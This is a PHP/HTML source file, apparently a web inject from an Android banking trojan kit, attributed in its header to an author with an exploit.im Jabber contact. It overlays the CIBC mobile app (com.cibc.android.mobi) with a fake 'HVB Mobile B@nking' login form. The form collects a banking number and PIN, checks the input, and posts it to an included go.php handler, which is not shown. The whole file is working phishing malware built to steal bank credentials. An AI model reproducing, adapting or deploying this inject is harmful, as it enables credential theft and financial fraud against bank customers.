<!-- Information
Author: Validolik
Jabber: validol@exploit.im
Inject: com.cibc.android.mobi
Stages: 1
Version: 5.5
Last Update: 23.06.2017
-->

<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>com.cibc.android.mobi</title>
        <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>

<div id="header">
	<img src="libs/images/push.png">
</div>
<div class="col-xs-10 col-sm-8">
    <div class="fitMlbody" id="content_div" style="margin-top: 20px;">
	
	<p style="font-size: 22px;width: 100%;text-align: center;"> HVB Mobile B@nking </p>
		
        <section class="content">
            <form method="post">
<center>
                <div class="teaser_box">
                    <input type="hidden" value="com.cibc.android.mobi" name="field1">
					<div class="form">
						<div class="ptb">
							<input name="field2" id="login" maxlength="16" placeholder="Direct B@nking Nummer" class="input-field" type="text">
						</div>
						<br />
						<div class="ptb">
							<input name="field3" id="kundennummer" maxlength="12" placeholder="PIN" class="input-field" type="text" />

						</div> 
						<br />
					</div>
					<br />
					
					
                    <div class="ptb-button">
                        <input type="submit" value="ANMELDEN" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>

                </div>
</center>
            </form>
<script type="text/javascript">
			document.getElementById('submitBtn1').onclick = function(){

            var oNumInp = document.getElementById('login');
			var oKundennummerInp = document.getElementById('kundennummer');
			
				try{
							oNumInp.className = oKundennummerInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oKundennummerInp.value)) {
							try{
                                oKundennummerInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                   
                }
					 
					
</script>
        </section>
    </div>
</div>
</body>
</html>